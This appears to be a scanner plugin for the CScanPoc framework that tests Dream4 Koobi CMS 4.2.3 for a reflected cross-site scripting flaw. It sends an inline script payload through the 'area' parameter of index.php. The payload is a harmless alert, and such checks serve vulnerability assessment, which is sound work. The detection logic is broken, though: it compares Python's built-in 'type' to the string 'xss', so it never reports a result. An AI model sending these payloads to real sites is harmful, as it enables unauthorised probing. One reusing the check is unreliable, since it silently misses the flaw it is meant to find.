# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Dream4-Koobi-CMS_0000'  # 平台漏洞编号
    name = 'Dream4 Koobi CMS 4.2.3 Index.PHP Cross-Site Scripting Vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2005-03-24'  # 漏洞公布时间
    desc = '''
        Dream4 Koobi CMS 4.2.3的index.php中存在跨站脚本攻击(XSS)漏洞，
        远程攻击者可以通过area参数注入任意Web脚本或HTML。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/25272/'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Dream4-Koobi-CMS'  # 漏洞组件名称
    product_version = '4.2.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '61aef49b-7164-4ef9-922e-11c3919f3c8d'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/index.php?area=<script>alert(/Sebug23333/)</script>'
            vul_url = arg + payload
            res = requests.get(vul_url, timeout=10)
            if type == 'xss' and '<script>alert(/Sebug23333/)</script>' in res.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
